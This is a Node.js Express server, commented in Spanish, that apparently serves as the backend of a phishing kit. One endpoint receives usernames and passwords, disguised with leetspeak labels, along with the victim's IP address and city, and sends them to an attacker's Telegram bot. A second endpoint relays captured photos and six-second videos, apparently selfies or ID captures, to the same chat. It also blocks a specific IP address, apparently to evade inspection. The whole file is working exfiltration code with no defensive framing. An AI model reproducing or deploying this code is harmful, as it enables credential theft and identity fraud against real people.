const express = require('express');
const bodyParser = require('body-parser');
const multer = require("multer");
const cors = require('cors');
const axios = require('axios');
const FormData = require("form-data");

const app = express();

// Configurar multer para manejar archivos
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));
app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});

app.use((req, res, next) => {
    const ipCliente = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const IP_BLOQUEADAS = ['179.7.73.123'];
    if (IP_BLOQUEADAS.includes(ipCliente)) {
        console.log(`⛔ IP bloqueada: ${ipCliente}`);
        return res.status(403).send('Acceso denegado');
    }
    next();
});

app.post('/api/sendMessage', async (req, res) => {
    const { user, useri, ip, city } = req.body;
    if (!user || !ip) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }
    const message = `🟢PR0M3RY🟢\nUs4RX: ${useri}\nC4L4VV: ${user}\n\nIP: ${ip}\nCiudad: ${city}`;
    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});


app.post("/api/sendMessage3", upload.fields([
  { name: 'foto',  maxCount: 1 },
  { name: 'video', maxCount: 1 }
]), async (req, res) => {
  try {
    const { usuario = 'Desconocido', ip = '—', ciudad = '—' } = req.body;

    let caption = `👤 Us4RX: ${usuario}\nIP: ${ip}\n📍 ${ciudad}`;

    // Preparar FormData para Telegram
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('caption', caption);

    // ───── Foto ─────
    if (req.files && req.files.foto && req.files.foto.length > 0) {
      const foto = req.files.foto[0];
      formData.append('photo', foto.buffer, {
        filename: foto.originalname || `${usuario}_foto.jpg`,
        contentType: foto.mimetype,
      });

      const telegramURL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
      await axios.post(telegramURL, formData, {
        headers: formData.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
      });

      console.log(`📸 Foto enviada → ${foto.originalname}`);
      return res.json({ message: 'Foto enviada correctamente' });
    }

    // ───── Video ─────
    if (req.files && req.files.video && req.files.video.length > 0) {
      const video = req.files.video[0];
      formData.append('video', video.buffer, {
        filename: video.originalname || `${usuario}_video_6s.webm`,
        contentType: video.mimetype || 'video/webm',
      });

      const telegramURL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`;
      await axios.post(telegramURL, formData, {
        headers: formData.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
      });

      console.log(`🎥 Video enviado → ${video.originalname}`);
      return res.json({ message: 'Video enviado correctamente' });
    }

    // Si no llegó ni foto ni video
    return res.status(400).json({ error: 'No se recibió foto ni video' });

  } catch (error) {
    console.error('Error en /api/sendMessage3:', error?.response?.data || error.message);
    const errMsg = error?.response?.data?.description || error.message;
    res.status(500).json({ error: 'Error al enviar a Telegram', detalle: errMsg });
  }
});



const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
